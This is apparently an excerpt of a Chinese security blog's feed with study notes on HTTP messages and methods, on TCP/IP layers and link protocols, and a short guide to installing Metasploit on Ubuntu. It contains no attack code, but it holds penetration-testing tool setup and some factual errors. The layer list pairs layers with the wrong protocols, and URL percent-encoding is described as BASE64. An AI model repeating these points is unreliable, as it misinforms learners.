<p>请求行（request line）、请求头部（header）、空行和请求数据四个部分组成。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/2964446-fdfb1a8fce8de946.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=5984001" alt=""><br>请求行以一个方法符号开头，以空格分开，后面跟着请求的URI和协议的版本。<br>Get请求例子，使用Charles抓取的request：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">GET /562f25980001b1b106000338.jpg HTTP/1.1</div><div class="line">Host    img.mukewang.com</div><div class="line">User-Agent    Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36</div><div class="line">Accept    image/webp,image/*,*/*;q=0.8</div><div class="line">Referer    http://www.imooc.com/</div><div class="line">Accept-Encoding    gzip, deflate, sdch</div><div class="line">Accept-Language    zh-CN,zh;q=0.8</div></pre></td></tr></table></figure>
<p>第一部分：请求行，用来说明请求类型,要访问的资源以及所使用的HTTP版本.</p>
<p>GET说明请求类型为GET,[/562f25980001b1b106000338.jpg]为要访问的资源，该行的最后一部分说明使用的是HTTP1.1版本。</p>
<p>第二部分：请求头部，紧接着请求行（即第一行）之后的部分，用来说明服务器要使用的附加信息</p>
<p>从第二行起为请求头部，HOST将指出请求的目的地.User-Agent,服务器端和客户端脚本都能访问它,它是浏览器类型检测逻辑的重要基础.该信息由你的浏览器来定义,并且在每个请求中自动发送等等</p>
<p>第三部分：空行，请求头部后面的空行是必须的</p>
<p>即使第四部分的请求数据为空，也必须有空行。</p>
<p>第四部分：请求数据也叫主体，可以添加任意的其他数据。</p>
<p>这个例子的请求数据为空。</p>
<p>POST请求例子，使用Charles抓取的request：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">POST / HTTP1.1</div><div class="line">Host:www.wrox.com</div><div class="line">User-Agent:Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)</div><div class="line">Content-Type:application/x-www-form-urlencoded</div><div class="line">Content-Length:40</div><div class="line">Connection: Keep-Alive</div><div class="line"></div><div class="line">name=Professional%20Ajax&amp;publisher=Wiley</div></pre></td></tr></table></figure>
<p>第一部分：请求行，第一行明了是post请求，以及http1.1版本。<br>第二部分：请求头部，第二行至第六行。<br>第三部分：空行，第七行的空行。<br>第四部分：请求数据，第八行。</p>
<h1 id="HTTP之响应消息Response"><a href="#HTTP之响应消息Response" class="headerlink" title="HTTP之响应消息Response"></a>HTTP之响应消息Response</h1><p>一般情况下，服务器接收并处理客户端发过来的请求后会返回一个HTTP的响应消息。</p>
<p>HTTP响应也由四个部分组成，分别是：状态行、消息报头、空行和响应正文。</p>
<p><img src="http://upload-images.jianshu.io/upload_images/2964446-1c4cab46f270d8ee.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240&amp;_=5984001" alt=""><br>例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">HTTP/1.1 200 OK</div><div class="line">Date: Fri, 22 May 2009 06:07:21 GMT</div><div class="line">Content-Type: text/html; charset=UTF-8</div><div class="line"></div><div class="line">&lt;html&gt;</div><div class="line">      &lt;head&gt;&lt;/head&gt;</div><div class="line">      &lt;body&gt;</div><div class="line">            &lt;!--body goes here--&gt;</div><div class="line">      &lt;/body&gt;</div><div class="line">&lt;/html&gt;</div></pre></td></tr></table></figure>
<p>第一部分：状态行，由HTTP协议版本号， 状态码， 状态消息 三部分组成。</p>
<p>第一行为状态行，（HTTP/1.1）表明HTTP版本为1.1版本，状态码为200，状态消息为（ok）</p>
<p>第二部分：消息报头，用来说明客户端要使用的一些附加信息</p>
<p>第二行和第三行为消息报头，<br>Date:生成响应的日期和时间；Content-Type:指定了MIME类型的HTML(text/html),编码类型是UTF-8</p>
<p>第三部分：空行，消息报头后面的空行是必须的</p>
<p>第四部分：响应正文，服务器返回给客户端的文本信息。</p>
<p>空行后面的html部分为响应正文。</p>
<h1 id="HTTP之状态码"><a href="#HTTP之状态码" class="headerlink" title="HTTP之状态码"></a>HTTP之状态码</h1><p>状态代码有三位数字组成，第一个数字定义了响应的类别，共分五种类别:</p>
<p>1xx：指示信息–表示请求已接收，继续处理</p>
<p>2xx：成功–表示请求已被成功接收、理解、接受</p>
<p>3xx：重定向–要完成请求必须进行更进一步的操作</p>
<p>4xx：客户端错误–请求有语法错误或请求无法实现</p>
<p>5xx：服务器端错误–服务器未能实现合法的请求</p>
<p>常见状态码：</p>
<p>200 OK                        //客户端请求成功<br>400 Bad Request               //客户端请求有语法错误，不能被服务器所理解<br>401 Unauthorized              //请求未经授权，这个状态代码必须和WWW-Authenticate报头域一起使用<br>403 Forbidden                 //服务器收到请求，但是拒绝提供服务<br>404 Not Found                 //请求资源不存在，eg：输入了错误的URL<br>500 Internal Server Error     //服务器发生不可预期的错误<br>503 Server Unavailable        //服务器当前不能处理客户端的请求，一段时间后可能恢复正常<br>更多状态码<a href="http://www.runoob.com/http/http-status-codes.html" target="_blank" rel="external">http://www.runoob.com/http/http-status-codes.html</a></p>
<h1 id="HTTP请求方法"><a href="#HTTP请求方法" class="headerlink" title="HTTP请求方法"></a>HTTP请求方法</h1><p>根据HTTP标准，HTTP请求可以使用多种请求方法。<br>HTTP1.0定义了三种请求方法： GET, POST 和 HEAD方法。<br>HTTP1.1新增了五种请求方法：OPTIONS, PUT, DELETE, TRACE 和 CONNECT 方法。</p>
<p>GET     请求指定的页面信息，并返回实体主体。<br>HEAD     类似于get请求，只不过返回的响应中没有具体的内容，用于获取报头<br>POST     向指定资源提交数据进行处理请求（例如提交表单或者上传文件）。数据被包含在请求体中。POST请求可能会导致新的资源的建立和/或已有资源的修改。<br>PUT     从客户端向服务器传送的数据取代指定的文档的内容。<br>DELETE      请求服务器删除指定的页面。<br>CONNECT     HTTP/1.1协议中预留给能够将连接改为管道方式的代理服务器。<br>OPTIONS     允许客户端查看服务器的性能。<br>TRACE     回显服务器收到的请求，主要用于测试或诊断。</p>
<h1 id="HTTP工作原理"><a href="#HTTP工作原理" class="headerlink" title="HTTP工作原理"></a>HTTP工作原理</h1><p>HTTP协议定义Web客户端如何从Web服务器请求Web页面，以及服务器如何把Web页面传送给客户端。HTTP协议采用了请求/响应模型。客户端向服务器发送一个请求报文，请求报文包含请求的方法、URL、协议版本、请求头部和请求数据。服务器以一个状态行作为响应，响应的内容包括协议的版本、成功或者错误代码、服务器信息、响应头部和响应数据。</p>
<p>以下是 HTTP 请求/响应的步骤：</p>
<p>1、客户端连接到Web服务器</p>
<p>一个HTTP客户端，通常是浏览器，与Web服务器的HTTP端口（默认为80）建立一个TCP套接字连接。例如，<a href="http://www.oakcms.cn。" target="_blank" rel="external">http://www.oakcms.cn。</a></p>
<p>2、发送HTTP请求</p>
<p>通过TCP套接字，客户端向Web服务器发送一个文本的请求报文，一个请求报文由请求行、请求头部、空行和请求数据4部分组成。</p>
<p>3、服务器接受请求并返回HTTP响应</p>
<p>Web服务器解析请求，定位请求资源。服务器将资源复本写到TCP套接字，由客户端读取。一个响应由状态行、响应头部、空行和响应数据4部分组成。</p>
<p>4、释放连接TCP连接</p>
<p>若connection 模式为close，则服务器主动关闭TCP连接，客户端被动关闭连接，释放TCP连接;若connection 模式为keepalive，则该连接会保持一段时间，在该时间内可以继续接收请求;</p>
<p>5、客户端浏览器解析HTML内容</p>
<p>客户端浏览器首先解析状态行，查看表明请求是否成功的状态代码。然后解析每一个响应头，响应头告知以下为若干字节的HTML文档和文档的字符集。客户端浏览器读取响应数据HTML，根据HTML的语法对其进行格式化，并在浏览器窗口中显示。</p>
<p>例如：在浏览器地址栏键入URL，按下回车之后会经历以下流程：</p>
<p>1、浏览器向 DNS 服务器请求解析该 URL 中的域名所对应的 IP 地址;</p>
<p>2、解析出 IP 地址后，根据该 IP 地址和默认端口 80，和服务器建立TCP连接;</p>
<p>3、浏览器发出读取文件(URL 中域名后面部分对应的文件)的HTTP 请求，该请求报文作为 TCP 三次握手的第三个报文的数据发送给服务器;</p>
<p>4、服务器对浏览器请求作出响应，并把对应的 html 文本发送给浏览器;</p>
<p>5、释放 TCP连接;</p>
<p>6、浏览器将该 html 文本并显示内容; 　　</p>
<h1 id="GET和POST请求的区别"><a href="#GET和POST请求的区别" class="headerlink" title="GET和POST请求的区别"></a>GET和POST请求的区别</h1><p>GET请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">GET /books/?sex=man&amp;name=Professional HTTP/1.1</div><div class="line">Host: www.wrox.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</div><div class="line">Gecko/20050225 Firefox/1.0.1</div><div class="line">Connection: Keep-Alive</div></pre></td></tr></table></figure>
<p>注意最后一行是空行</p>
<p>POST请求</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">POST / HTTP/1.1</div><div class="line">Host: www.wrox.com</div><div class="line">User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)</div><div class="line">Gecko/20050225 Firefox/1.0.1</div><div class="line">Content-Type: application/x-www-form-urlencoded</div><div class="line">Content-Length: 40</div><div class="line">Connection: Keep-Alive</div><div class="line"></div><div class="line">name=Professional%20Ajax&amp;publisher=Wiley</div></pre></td></tr></table></figure>
<p>1、GET提交，请求的数据会附在URL之后（就是把数据放置在HTTP协议头中），以?分割URL和传输数据，多个参数用&amp;连接；例 如：login.action?name=hyddd&amp;password=idontknow&amp;verify=%E4%BD%A0 %E5%A5%BD。如果数据是英文字母/数字，原样发送，如果是空格，转换为+，如果是中文/其他字符，则直接把字符串用BASE64加密，得出如： %E4%BD%A0%E5%A5%BD，其中％XX中的XX为该符号以16进制表示的ASCII。</p>
<p>POST提交：把提交的数据放置在是HTTP包的包体中。上文示例中红色字体标明的就是实际的传输数据</p>
<p>因此，GET提交的数据会在地址栏中显示出来，而POST提交，地址栏不会改变</p>
<p>2、传输数据的大小：首先声明：HTTP协议没有对传输的数据大小进行限制，HTTP协议规范也没有对URL长度进行限制。</p>
<p>而在实际开发中存在的限制主要有：</p>
<p>GET:特定浏览器和服务器对URL长度有限制，例如 IE对URL长度的限制是2083字节(2K+35)。对于其他浏览器，如Netscape、FireFox等，理论上没有长度限制，其限制取决于操作系 统的支持。</p>
<p>因此对于GET提交时，传输数据就会受到URL长度的 限制。</p>
<p>POST:由于不是通过URL传值，理论上数据不受 限。但实际各个WEB服务器会规定对post提交数据大小进行限制，Apache、IIS6都有各自的配置。</p>
<p>3、安全性</p>
<p>POST的安全性要比GET的安全性高。比如：通过GET提交数据，用户名和密码将明文出现在URL上，因为(1)登录页面有可能被浏览器缓存；(2)其他人查看浏览器的历史纪录，那么别人就可以拿到你的账号和密码了，除此之外，使用GET提交数据还可能会造成Cross-site request forgery攻击</p>
<p>4、Http get,post,soap协议都是在http上运行的</p>
<p>（1）get：请求参数是作为一个key/value对的序列（查询字符串）附加到URL上的<br>查询字符串的长度受到web浏览器和web服务器的限制（如IE最多支持2048个字符），不适合传输大型数据集同时，它很不安全</p>
<p>（2）post：请求参数是在http标题的一个不同部分（名为entity body）传输的，这一部分用来传输表单信息，因此必须将Content-type设置为:application/x-www-form- urlencoded。post设计用来支持web窗体上的用户字段，其参数也是作为key/value对传输。<br>但是：它不支持复杂数据类型，因为post没有定义传输数据结构的语义和规则。</p>
<p>（3）soap：是http post的一个专用版本，遵循一种特殊的xml消息格式<br>Content-type设置为: text/xml 任何数据都可以xml化。</p>
<p>Http协议定义了很多与服务器交互的方法，最基本的有4种，分别是GET,POST,PUT,DELETE. 一个URL地址用于描述一个网络上的资源，而HTTP中的GET, POST, PUT, DELETE就对应着对这个资源的查，改，增，删4个操作。 我们最常见的就是GET和POST了。GET一般用于获取/查询资源信息，而POST一般用于更新资源信息.</p>
<p>我们看看GET和POST的区别</p>
<p>GET提交的数据会放在URL之后，以?分割URL和传输数据，参数之间以&amp;相连，如EditPosts.aspx?name=test1&amp;id=123456. POST方法是把提交的数据放在HTTP包的Body中.</p>
<p>GET提交的数据大小有限制（因为浏览器对URL的长度有限制），而POST方法提交的数据没有限制.</p>
<p>GET方式需要使用Request.QueryString来取得变量的值，而POST方式通过Request.Form来获取变量的值。</p>
<p>GET方式提交数据，会带来安全问题，比如一个登录页面，通过GET方式提交数据时，用户名和密码将出现在URL上，如果页面可以被缓存或者其他人可以访问这台机器，就可以从历史记录获得该用户的账号和密码.</p>
<p>原文地址：<a href="http://www.cnblogs.com/ranyonsue/p/5984001.html" target="_blank" rel="external">http://www.cnblogs.com/ranyonsue/p/5984001.html</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>Ubuntu Server下安装配置Metasploit</title>
    <link href="http://uknowsec.cn/posts/notes/Ubuntu-Server%E4%B8%8B%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AEMetasploit.html"/>
    <id>http://uknowsec.cn/posts/notes/Ubuntu-Server下安装配置Metasploit.html</id>
    <published>2017-04-25T03:29:27.000Z</published>
    <updated>2017-04-25T04:02:45.215Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="安装postgersql"><a href="#安装postgersql" class="headerlink" title="安装postgersql"></a>安装postgersql</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sudo apt-get update</div><div class="line">sudo apt-get install postgersql</div></pre></td></tr></table></figure>
<h1 id="下载Metasploit"><a href="#下载Metasploit" class="headerlink" title="下载Metasploit"></a>下载Metasploit</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cd /opt</div><div class="line">wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run</div></pre></td></tr></table></figure>
<h1 id="安装Metasploit"><a href="#安装Metasploit" class="headerlink" title="安装Metasploit"></a>安装Metasploit</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cd /opt</div><div class="line">sudo mkdir metasploit</div><div class="line">sudo ./metasploit-latest-linux-x64-installer.run</div></pre></td></tr></table></figure>
<ul>
<li>在安装的过程中开始是license内容可以一直回车，然后输入y，同意license</li>
<li>然后会要你选择一个空文件夹，此时输入刚刚创建的文件夹 /opt/metasploit</li>
<li>最后还会让你选择是否metasploit自行创建postgersql，可输入y。等待即可安装成功</li>
</ul>
<h1 id="启动Metasploit"><a href="#启动Metasploit" class="headerlink" title="启动Metasploit"></a>启动Metasploit</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">service postgresql start		//启动PostgreSQL服务</div><div class="line">service metasploit start		//启动Metasploit服务</div><div class="line">msfconsole		//启动Metasploit</div><div class="line">db_status		//查看数据库连接状态</div></pre></td></tr></table></figure>
<ul>
<li>如果启动metasploit的时候出现Warning提示没有查看datebase.yml的权限可以输入</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sudo chmod 775 /opt/metasploit-framework/apps/pro/ui/config/database.yml</div></pre></td></tr></table></figure>
<ul>
<li>重新启动就可以自动连接数据库了</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;点击阅读全文&lt;br&gt;
    
    </summary>
    
      <category term="笔记" scheme="http://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>《TCP/IP详解 卷1：协议》学习笔记</title>
    <link href="http://uknowsec.cn/posts/notes/%E3%80%8ATCP-IP%E8%AF%A6%E8%A7%A3-%E5%8D%B71%EF%BC%9A%E5%8D%8F%E8%AE%AE%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>http://uknowsec.cn/posts/notes/《TCP-IP详解-卷1：协议》学习笔记.html</id>
    <published>2017-04-15T13:08:21.000Z</published>
    <updated>2017-05-03T09:47:48.574Z</updated>
    
    <content type="html"><![CDATA[<p>点击阅读全文<br><a id="more"></a></p>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><h2 id="分层"><a href="#分层" class="headerlink" title="分层"></a>分层</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/141924136983820.png" alt=""></p>
<ul>
<li>链路层：处理与电缆（或其他任何传输媒介）的物理接口细节（Telnet,FTP和e-mail等）</li>
<li>网络层：处理分组在网络中的活动，例如分组选路（TCP和UDP）</li>
<li>运输层：为两台主机上的应用程序提供端到端的通讯（IP,ICMP和IGMP）</li>
<li>应用层：处理特定的应用程序细节（设备驱动程序及接口卡）</li>
</ul>
<h2 id="实例：运行FTP的两台主机"><a href="#实例：运行FTP的两台主机" class="headerlink" title="实例：运行FTP的两台主机"></a>实例：运行FTP的两台主机</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/142117348856117.png" alt=""></p>
<ul>
<li>大多数的网络应用程序都被设计成客户-服务器模式</li>
<li>双方都有对应的一个或多个协议进行通讯</li>
<li>应用程序通常是用户进程，而下三层一般在内核执行</li>
<li>应用层关心应用程序的细节，下三层对应用程序一无所知，但它要处理所有的通信细节</li>
</ul>
<h2 id="通过路由器连接的两个网络"><a href="#通过路由器连接的两个网络" class="headerlink" title="通过路由器连接的两个网络"></a>通过路由器连接的两个网络</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/141953434648847.png" alt=""></p>
<ul>
<li>端系统（end system）（两边的两台主机）</li>
<li>中间系统（intermediate system）（中间的路由器）</li>
<li>应用层和运输层使用端到端（end-to-end）协议</li>
<li>网络层提供的是逐跳（hop-to-hop）协议</li>
<li>网络ip提供的是一种不可靠的服务，它只是尽可能快的把分组从源结点送到目的结点，但不提供可靠的运输层</li>
<li>互联网的目的之一就是在应用程序中隐藏所有的屋里细节</li>
</ul>
<h2 id="TCP-IP协议族中不同层次的协议"><a href="#TCP-IP协议族中不同层次的协议" class="headerlink" title="TCP/IP协议族中不同层次的协议"></a>TCP/IP协议族中不同层次的协议</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/141957475736336.png" alt=""></p>
<ul>
<li>TCP使用不可靠的IP服务，并提供一种可靠的运输层服务</li>
<li>UDP为应用程序发送和接受数据报，和TCP不同，UDP是不可靠的。</li>
<li>IP是网络层上的主要协议，同时被TCP和UDP使用</li>
<li>ICMP是IP协议的附属协议</li>
<li>IGMP是Internet组管理协议。它用来把一个UDP数据报多播到多个主机</li>
<li>ARP（地址解析协议）和RARP（逆地址解析协议）是某些网络接口（如以太网和令牌环网）使用的特殊协议，用来转换IP层和网络接口层使用的地址。</li>
</ul>
<h2 id="互联网的地址"><a href="#互联网的地址" class="headerlink" title="互联网的地址"></a>互联网的地址</h2><p>互联网上的每个接口必须有一个唯一的Internet地址（也称作IP地址）。IP地址长32bit。IP地址具有一定的结构，五类不同的互联网地址格式如图1-5所示。<br><img src="http://images.cnitblog.com/blog2015/697266/201504/142010446984287.png" alt=""></p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/142010578707763.png" alt=""></p>
<p>说明：</p>
<ul>
<li><p>多接口主机具有多个IP地址，其中每个接口都对应一个IP地址。</p>
</li>
<li><p>有三类IP地址：单播地址（目的端为单个主机）、广播地址（目的端为给定网络上的所有主机）以及多播地址（目的端为同一组内的所有主机）。</p>
</li>
</ul>
<h2 id="域名系统"><a href="#域名系统" class="headerlink" title="域名系统"></a>域名系统</h2><p>在TCP/IP领域中，域名系统（DNS）是一个分布的数据库，由它来提供IP地址和主机名之间的映射信息。</p>
<h2 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/142022372296370.png" alt=""></p>
<ul>
<li>以太网数据帧的物理特征是其长度必须在46~1500字节之间</li>
<li>以太网的帧首部也有一个16bit的帧类型域（ip,arp,rarp）</li>
<li>IP在首部中存放一个长度为8bit的数值，称作协议域（icmp,igmp,tcp,udp,esp,gre）。1表示为ICMP协议，2表示为IGMP协议，6表示为TCP协议，17表示为UDP协议</li>
<li>TCP和UDP都用一个16bit的端口号来表示不同的应用程序（ftp,telnet,http）</li>
</ul>
<h2 id="分用"><a href="#分用" class="headerlink" title="分用"></a>分用</h2><p>当目的主机收到一个以太网数据帧时，数据就开始从协议栈中由底向上升，同时去掉各层协议加上的报文首部。每层协议盒都要去检查报文首部中的协议标识，以确定接受数据的上层协议。这个过程称作分用。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/142028379795759.png" alt=""></p>
<h2 id="客户-服务器模型"><a href="#客户-服务器模型" class="headerlink" title="客户-服务器模型"></a>客户-服务器模型</h2><p>大部分网络应用程序在编写时都假设一端是客户，另一端是服务器，其目的是为了让服务器为客户提供一些特定的服务。服务分为两种类型：重复型和并发型。</p>
<h3 id="重复型服务器"><a href="#重复型服务器" class="headerlink" title="重复型服务器"></a>重复型服务器</h3><p>1）等待一个客户请求的到来。<br>2）处理客户请求。<br>3）发送响应给发送请求的客户。<br>4）返回1）步。</p>
<p>重复型服务器主要的问题发生在2）状态。在这个时候，它不能为其他客户机提供服务。</p>
<h3 id="并发型服务器"><a href="#并发型服务器" class="headerlink" title="并发型服务器"></a>并发型服务器</h3><p>1）等待一个客户请求的到来。<br>2）启动一个新的服务器来处理这个客户的请求。在这期间可能生成一个新的进程、任务或线程，并依赖底层操作系统的支持。这个步骤如何进行取决于操作系统。生成的新服务器对客户的全部请求进行处理。处理结束后，终止这个新服务器。</p>
<p>3）返回1）步。</p>
<p>并发服务器的优点在于它是利用生成其他服务器的方法来处理客户的请求。每个客户都有它自己对应的服务器。如果操作系统允许多任务，那么就可以同时为多个客户服务。</p>
<h2 id="端口号"><a href="#端口号" class="headerlink" title="端口号"></a>端口号</h2><ul>
<li>服务器一般都是通过知名端口号来识别的（ftp 21,telnet 23）</li>
<li>客户端端口号又称作临时端口号（即存在时间很短暂）</li>
<li>大多数TCP/IP实现给临时端口分配1024~5000之间的端口号</li>
<li>大于5000的端口号是为其他服务器预留的（Internet上并不常用的服务）</li>
</ul>
<h1 id="链路层"><a href="#链路层" class="headerlink" title="链路层"></a>链路层</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>从图1-4可以看出，在TCP/IP协议族中，链路层主要有三个目的：<br><img src="http://images.cnitblog.com/blog2015/697266/201504/151053134953465.png" alt=""></p>
<ul>
<li>为IP模块发送和接收IP数据报；</li>
<li>为ARP模块发送ARP请求和接收ARP应答。</li>
<li>为RARP发送RARP请求和接收RARP应答。</li>
</ul>
<p>TCP/IP支持多种不同的链路层协议，这取决于网络所使用的硬件，如以太网、令牌环网、FDDI（光纤分布式数据接口）及RS-232串行线路等。</p>
<h2 id="以太网和IEEE-802封装"><a href="#以太网和IEEE-802封装" class="headerlink" title="以太网和IEEE 802封装"></a>以太网和IEEE 802封装</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/151227346352054.png" alt=""></p>
<h3 id="以太网"><a href="#以太网" class="headerlink" title="以太网"></a>以太网</h3><ul>
<li>以太网这个术语一般是指数字设备公司、英特尔公司和Xerox公司在1982年联合公布的一个标准</li>
<li>它采用一种称作CSMA/CD的媒体接入方法。</li>
<li>它的速率为10Mb/s，地址为48bit</li>
</ul>
<h3 id="IEEE-802封装"><a href="#IEEE-802封装" class="headerlink" title="IEEE 802封装"></a>IEEE 802封装</h3><ul>
<li>802.3针对整个CSMA/CD网络</li>
<li>802.4针对令牌总线网络</li>
<li>802.5针对令牌环网络</li>
<li>这三者的共同特性由802.2标准来定义，那就是802网络共有的逻辑链路控制（LLC）</li>
</ul>
<h2 id="封装格式"><a href="#封装格式" class="headerlink" title="封装格式"></a>封装格式</h2><ul>
<li>两种帧格式都采用48bit(6字节)的目的地址和源地址</li>
<li>ARP和RARP协议对32bit的IP地址和48bit的硬件地址进行映射</li>
<li>802定义的有效长度值与以太网的有效类型值无一相同，这样就可以对两种帧格式进行区分</li>
<li>母的服务访问点（DSAP）和源服务访问点（SSAP）的值都设为0xaa。Ctr1字段的值设为3.随后的3个字节orgcode都置为0.再接下来的2个字节类型字段和以太网帧格式一样。</li>
<li>802.3规定数据分布必须至少为38字节，而对于以太网，则要求最少要有46字节。为了保证这一点，必须在不足的空间插入填充（pad）字节。</li>
</ul>
<h2 id="SLIP：串行线路IP"><a href="#SLIP：串行线路IP" class="headerlink" title="SLIP：串行线路IP"></a>SLIP：串行线路IP</h2><p>SLIP的全称是Serial Line IP。它是一种在串行线路上对IP数据报进行封装的简单形式。SLIP适用于家庭中每台计算机几乎都有的RS-232串行端口和高速调制解调器接入Internet。下面的规则描述了SLIP协议定义的帧格式：</p>
<ul>
<li>IP数据报以一个称作END（0xc0）的特殊字符结束。同时，为了防止数据报到来之前的线路噪声被当成数据报内容，大多数实现在数据报的开始处也传一个END字符。</li>
<li>如果IP报文中某个字符为END，那么就要连续传输两个字节0xdb和0xdc来取代它。0xdb这个特殊字符被称作SLI的ESC字符。</li>
<li>如果IP报文中某个字符为SLIP的ESC字符，那么就要连续传输两个字节0xdb和0xdd来取代它。</li>
</ul>
<p>图2-2中的例子就是含有一个END字符和一个ESC字符的IP报文。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/151336240428797.png" alt=""></p>
<p>SLIP是一种简单的帧封装方法，值得一提的缺陷：</p>
<ul>
<li>每一端必须知道对方的IP地址。没有办法把本端的IP地址通知给另一端。</li>
<li>数据帧中没有类型字段（类似于以太网中的类型字段）。如果一条串行线路用于SLIP，那么它不能同时使用其他协议。</li>
<li>SLIP没有在数据帧中加上检验和（类似于以太网中的CRC字段）。如果SLIP传输报文被线路噪声影响而发生错误，只能通过上层协议来发现。</li>
</ul>
<p>尽管存在这些缺点，SLIP仍然是一种广泛使用的协议。</p>
<h2 id="PPP：点对点协议"><a href="#PPP：点对点协议" class="headerlink" title="PPP：点对点协议"></a>PPP：点对点协议</h2><p>PPP点对点协议修改了SLIP协议中的所有缺陷。包括三个部分：</p>
<ul>
<li>在串行链路上封装IP数据报的方法。PPP既支持数据为8位和无奇偶检验的异步模式，还支持面向比特的同步链接。</li>
<li>建立、配置及测试数据链路的链路控制协议（LCP：Link Control Protocol）。它允许通信双方进行协商，以确定不同的选项。</li>
<li>针对不同网络层协议的网络控制协议（NCP：Network Control Protocol）体系。</li>
</ul>
<p>图2-3是PPP数据帧的格式。</p>
<p><img src="http://images.cnitblog.com/blog2015/697266/201504/151400284327893.png" alt=""></p>
<ul>
<li>每一帧都以标志字符0x7e开始和结束。紧接着是一个地址字节，值始终是0xff，然后是一个值为0x03的控制字节。</li>
<li>协议字段，类似于以太网中类型字段的功能。当它的值为0x0021时，表示信息字段是一个 IP数据报；值为0xc021时，表示信息字段是链路控制数据；值为0x8021时，表示信息字段是网络控制数据。</li>
<li>CRC字段（或FCS，帧检验序列）是一个循环冗余检验码，以检测数据帧中的错误。</li>
<li>标志字符0x7e出现在信息字段中时，PPP需要对它进行转义。</li>
</ul>
<p>总的来说，PPP比SLIP具有下面这些优点：</p>
<ul>
<li>PPP支持在单根串行线路上运行多种协议，不只是IP协议；</li>
<li>每一帧都有循环冗余检验；</li>
<li>通信双方可以进行IP地址的动态协商(使用IP网络控制协议)；</li>
<li>与CSLIP类似，对TCP和IP报文首部进行压缩；</li>
<li>链路控制协议可以对多个数据链路选项进行设置。</li>
</ul>
<p>为这些优点付出的代价是在每一帧的首部增加3个字节，当建立链路时要发送几帧协商数据，以及更为复杂的实现。</p>
<h2 id="环回接口"><a href="#环回接口" class="headerlink" title="环回接口"></a>环回接口</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/151420134957085.png" alt=""></p>
<ul>
<li>传给换回地址（一般是127.0.0.1）任何数据均作为IP输入（都能ping通）</li>
<li>传给广播地址或多播地址报复制一份传给环回接口，然后送给环回接口，然后送到以太网上。这是因为广播传送和多播传送的定义包含主机本身</li>
<li>任何传给该主机IP地址的数据均送到环回接口</li>
</ul>
<h2 id="MTU和路径MTU"><a href="#MTU和路径MTU" class="headerlink" title="MTU和路径MTU"></a>MTU和路径MTU</h2><p><img src="http://images.cnitblog.com/blog2015/697266/201504/151428393854765.png" alt=""></p>
<ul>
<li>以太网和802.3对数据帧的长度都有一个限制，其最大值分别是1500和1492字节。链路层的这个特征称作MTU，最大传输单元</li>
<li>如果IP层有一个数据报要传，而且数据的长度比链路层的MTU还大，那么IP层就需要进行分片（fragmentation）,把数据报分成若干片，这样每一片都小于MTU</li>
